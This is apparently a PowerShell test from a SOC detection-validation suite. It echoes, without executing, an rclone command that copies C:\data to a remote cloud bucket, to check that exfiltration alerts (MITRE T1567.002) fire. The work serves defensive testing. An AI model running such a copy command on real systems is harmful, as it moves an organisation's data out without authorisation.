﻿#Requires -Version 5.1
# Test-SOC1151 :: Rclone usage cmdline (rclone copy + --transfers)
# MITRE T1567.002 (Exfiltration)  |  kind=echo  |  BENIGN validation
function Test-SOC1151 {
    [CmdletBinding()]
    param([switch]$IncludeNetwork,[string]$CanaryUrl)
    $rid = $Global:ATR.RunId
    $wd  = $Global:ATR.WorkDir
    $marker = 'ATRVAL_' + $rid
    $payload = Expand-AtrTokens 'rclone copy C:\data remote:bucket --transfers 8 --progress ATRVAL_%RID%'
    $ok = Invoke-AtrProc -FilePath "$env:SystemRoot\System32\cmd.exe" -Arguments ('/c echo ' + $payload) -Hidden
    $status = if($ok){'RAN'}else{'ERROR'}; $detail = 'echo cmdline signature: ' + $payload
    return (New-AtrResult 'SOC1151' 'Rclone usage cmdline (rclone copy + --transfers)' 'Exfiltration' 'T1567.002' $status $detail $marker)
}
